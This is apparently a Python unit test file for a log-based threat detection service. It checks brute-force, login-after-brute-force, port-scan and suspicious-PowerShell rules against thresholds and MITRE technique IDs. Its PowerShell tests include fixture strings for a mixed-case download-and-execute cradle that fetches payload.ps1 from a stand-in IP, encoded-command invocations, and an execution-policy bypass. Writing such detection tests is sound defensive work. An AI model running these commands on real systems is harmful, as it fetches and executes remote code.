"""Unit tests for threat detection rules.

Covers:
- True sliding window evaluation (Rule A)
- Threshold exact vs one-below boundary testing (Rules A & C)
- Mixed-case 'iEx' and encoded flag abbreviations (Rule D)
- Benign command non-alerting (Get-EventLog, Get-Process)
- MITRE technique code linkage for each of the 4 rules
"""

from datetime import datetime, timedelta, timezone

from app.core.enums import AlertSeverity, LogSeverity
from app.models.security_log import SecurityLog
from app.services.detection.rules import (
    BruteForceRule,
    LoginAfterBruteForceRule,
    PortScanRule,
    SuspiciousPowerShellRule,
)

BASE_TIME = datetime(2026, 11, 4, 12, 0, 0, tzinfo=timezone.utc)


def test_brute_force_rule_thresholds():
    """Rule A boundary check: exactly at threshold -> alert; one below -> no alert."""
    rule = BruteForceRule(threshold=5, window_minutes=5)

    # 4 failures (one below threshold)
    logs_below = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 20),
            source_ip="192.168.1.100",
            destination_ip="10.0.0.5",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for i in range(4)
    ]
    assert len(rule.evaluate(logs_below)) == 0

    # 5 failures (exactly at threshold)
    logs_exact = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 20),
            source_ip="192.168.1.100",
            destination_ip="10.0.0.5",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for i in range(5)
    ]
    alerts_exact = rule.evaluate(logs_exact)
    assert len(alerts_exact) == 1
    assert alerts_exact[0].technique_id == "T1110"
    assert alerts_exact[0].severity == AlertSeverity.HIGH
    assert alerts_exact[0].source_ip == "192.168.1.100"
    assert "5 failed authentication events" in alerts_exact[0].description


def test_brute_force_true_sliding_window():
    """Verify true sliding window evaluated from every event.

    Relative offsets in MM:SS (minutes:seconds) from base:
    - 00:00 (2026-11-04T00:00:00Z)
    - 04:00 (2026-11-04T00:04:00Z)
    - 04:30 (2026-11-04T00:04:30Z)
    - 05:10 (2026-11-04T00:05:10Z)
    - 05:20 (2026-11-04T00:05:20Z)
    - 05:40 (2026-11-04T00:05:40Z)

    Verification:
    - Anchor at 00:00 with 5m window ([00:00, 05:00]) covers only 3 events (00:00, 04:00, 04:30) -> NO ALERT (< 5).
    - Anchor at 04:00 with 5m window ([04:00, 09:00]) covers 5 events (04:00, 04:30, 05:10, 05:20, 05:40) within 1m40s -> ALERT (>= 5).
    """
    rule = BruteForceRule(threshold=5, window_minutes=5)
    base = datetime(2026, 11, 4, 0, 0, 0, tzinfo=timezone.utc)

    offsets = [
        timedelta(minutes=0, seconds=0),    # 00:00: 2026-11-04 00:00:00
        timedelta(minutes=4, seconds=0),    # 04:00: 2026-11-04 00:04:00
        timedelta(minutes=4, seconds=30),   # 04:30: 2026-11-04 00:04:30
        timedelta(minutes=5, seconds=10),   # 05:10: 2026-11-04 00:05:10
        timedelta(minutes=5, seconds=20),   # 05:20: 2026-11-04 00:05:20
        timedelta(minutes=5, seconds=40),   # 05:40: 2026-11-04 00:05:40
    ]

    logs = [
        SecurityLog(
            timestamp=base + offset,
            source_ip="192.168.1.77",
            destination_ip="10.0.0.1",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for offset in offsets
    ]

    # 1. Verify anchor at 00:00 contains only 3 events in [00:00, 05:00] -> NO alert
    anchor_00_events = [log for log in logs if log.timestamp <= base + timedelta(minutes=5)]
    assert len(anchor_00_events) == 3
    assert len(rule.evaluate(anchor_00_events)) == 0, "Anchor at 00:00 with only 3 events must NOT alert"

    # 2. Verify anchor at 04:00 contains 5 events in [04:00, 09:00] -> ALERT
    alerts = rule.evaluate(logs)
    assert len(alerts) == 1, "Expected exactly 1 alert from true sliding window evaluation"
    assert alerts[0].technique_id == "T1110"
    assert alerts[0].source_ip == "192.168.1.77"
    assert alerts[0].incident_start == base + timedelta(minutes=4)
    assert alerts[0].detection_time == base + timedelta(minutes=5, seconds=40)
    assert alerts[0].event_count == 5


def test_brute_force_rule_outside_window():
    """Rule A: events outside the time window do not trigger an alert."""
    rule = BruteForceRule(threshold=5, window_minutes=5)

    # 5 failures spaced 2 minutes apart (total 8 minutes span, no 5m window has >= 5)
    logs = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(minutes=i * 2),
            source_ip="192.168.1.100",
            destination_ip="10.0.0.5",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for i in range(5)
    ]
    assert len(rule.evaluate(logs)) == 0


def test_login_after_brute_force_rule():
    """Rule B: login within window after brute force -> alert; outside window -> no alert."""
    rule = LoginAfterBruteForceRule(bf_threshold=5, bf_window_minutes=5, success_window_minutes=10)

    # 5 failures between 12:00 and 12:02
    bf_logs = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 25),
            source_ip="203.0.113.10",
            destination_ip="10.0.0.5",
            username="admin",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for i in range(5)
    ]

    # Success at 12:05 (within 10m window after brute force)
    success_log_inside = SecurityLog(
        timestamp=BASE_TIME + timedelta(minutes=5),
        source_ip="203.0.113.10",
        destination_ip="10.0.0.5",
        username="admin",
        event_type="auth_success",
        severity=LogSeverity.INFO,
    )

    alerts = rule.evaluate(bf_logs + [success_log_inside])
    assert len(alerts) == 1
    assert alerts[0].technique_id == "T1078"
    assert alerts[0].severity == AlertSeverity.CRITICAL
    assert alerts[0].source_ip == "203.0.113.10"

    # Success at 12:20 (outside 10m window after brute force)
    success_log_outside = SecurityLog(
        timestamp=BASE_TIME + timedelta(minutes=20),
        source_ip="203.0.113.10",
        destination_ip="10.0.0.5",
        username="admin",
        event_type="auth_success",
        severity=LogSeverity.INFO,
    )
    assert len(rule.evaluate(bf_logs + [success_log_outside])) == 0


def test_port_scan_rule_thresholds():
    """Rule C boundary check: exactly at threshold -> alert; one below -> no alert."""
    rule = PortScanRule(port_threshold=10, window_minutes=2)

    # 9 distinct ports (one below threshold)
    logs_9 = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 5),
            source_ip="198.51.100.5",
            destination_ip="10.0.0.2",
            destination_port=20 + i,
            event_type="network_connection",
            severity=LogSeverity.LOW,
        )
        for i in range(9)
    ]
    assert len(rule.evaluate(logs_9)) == 0

    # 10 distinct ports (exactly at threshold)
    logs_10 = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 5),
            source_ip="198.51.100.5",
            destination_ip="10.0.0.2",
            destination_port=20 + i,
            event_type="network_connection",
            severity=LogSeverity.LOW,
        )
        for i in range(10)
    ]
    alerts_10 = rule.evaluate(logs_10)
    assert len(alerts_10) == 1
    assert alerts_10[0].technique_id == "T1046"
    assert alerts_10[0].severity == AlertSeverity.MEDIUM
    assert alerts_10[0].source_ip == "198.51.100.5"


def test_port_scan_rule_outside_window_and_duplicate_ports():
    """Rule C: events outside window or duplicate port events do not alert."""
    rule = PortScanRule(port_threshold=10, window_minutes=2)

    # 10 distinct ports spread over 5 minutes (no 2m window has >= 10)
    logs_spread = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 30),
            source_ip="198.51.100.5",
            destination_ip="10.0.0.2",
            destination_port=80 + i,
            event_type="network_connection",
            severity=LogSeverity.LOW,
        )
        for i in range(10)
    ]
    assert len(rule.evaluate(logs_spread)) == 0

    # 15 events but only 2 distinct ports
    logs_dup = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 3),
            source_ip="198.51.100.5",
            destination_ip="10.0.0.2",
            destination_port=80 if i % 2 == 0 else 443,
            event_type="network_connection",
            severity=LogSeverity.LOW,
        )
        for i in range(15)
    ]
    assert len(rule.evaluate(logs_dup)) == 0


def test_powershell_encoded_abbreviations_and_aliases():
    """Rule D: test PowerShell process requirement and lookbehind precision.

    Must NOT alert:
    - 'git commit -e'
    - 'perl -e "print 1"'
    - 'powershell.exe C:\\tools\\my-e.ps1'
    - 'powershell.exe Get-EventLog -LogName System'

    Must alert:
    - 'PowerShell.exe -e SQBFAFgA'
    - 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ec SQBFAFgA'
    - 'pwsh -ep bypass -File x.ps1'
    """
    rule = SuspiciousPowerShellRule()

    # Commands that MUST NOT trigger alerts
    must_not_alert = [
        "git commit -e",
        'perl -e "print 1"',
        r"powershell.exe C:\tools\my-e.ps1",
        "powershell.exe Get-EventLog -LogName System",
    ]

    for cmd in must_not_alert:
        logs = [
            SecurityLog(
                timestamp=BASE_TIME,
                source_ip="10.0.1.50",
                destination_ip="10.0.0.1",
                event_type="process_creation",
                command_line=cmd,
                severity=LogSeverity.INFO,
            )
        ]
        alerts = rule.evaluate(logs)
        assert len(alerts) == 0, f"Command must NOT trigger an alert: {cmd}"

    # Commands that MUST trigger alerts
    must_alert = [
        "PowerShell.exe -e SQBFAFgA",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ec SQBFAFgA",
        "pwsh -ep bypass -File x.ps1",
        "powershell.exe -enc aGVsbG8=",
        "powershell.exe -encodedcommand aGVsbG8=",
    ]

    for cmd in must_alert:
        logs = [
            SecurityLog(
                timestamp=BASE_TIME,
                source_ip="10.0.1.50",
                destination_ip="10.0.0.1",
                event_type="process_creation",
                command_line=cmd,
                severity=LogSeverity.HIGH,
            )
        ]
        alerts = rule.evaluate(logs)
        assert len(alerts) == 1, f"Expected alert for command: {cmd}"
        assert alerts[0].technique_id == "T1059.001"
        assert alerts[0].incident_start == BASE_TIME


def test_suspicious_powershell_mixed_case_iex_alerts():
    """Rule D: test that mixed-case 'iEx' triggers alert."""
    rule = SuspiciousPowerShellRule()

    mixed_iex_log = [
        SecurityLog(
            timestamp=BASE_TIME,
            source_ip="10.0.1.50",
            destination_ip="10.0.0.1",
            event_type="process_creation",
            command_line="powershell.exe -c \"iEx (New-Object Net.WebClient).dOwNlOaDsTrInG('http://198.51.100.5/payload.ps1')\"",
            severity=LogSeverity.HIGH,
        )
    ]
    alerts = rule.evaluate(mixed_iex_log)
    assert len(alerts) == 1
    assert alerts[0].technique_id == "T1059.001"
    assert alerts[0].severity == AlertSeverity.HIGH


def test_each_of_the_4_rules_links_to_correct_mitre_techniques():
    """Verify that each of the 4 detection rules specifies the correct MITRE ATT&CK technique code."""
    rule_a = BruteForceRule()
    rule_b = LoginAfterBruteForceRule()
    rule_c = PortScanRule()
    rule_d = SuspiciousPowerShellRule()

    assert rule_a.mitre_technique_id == "T1110"
    assert rule_b.mitre_technique_id == "T1078"
    assert rule_c.mitre_technique_id == "T1046"
    assert rule_d.mitre_technique_id == "T1059.001"
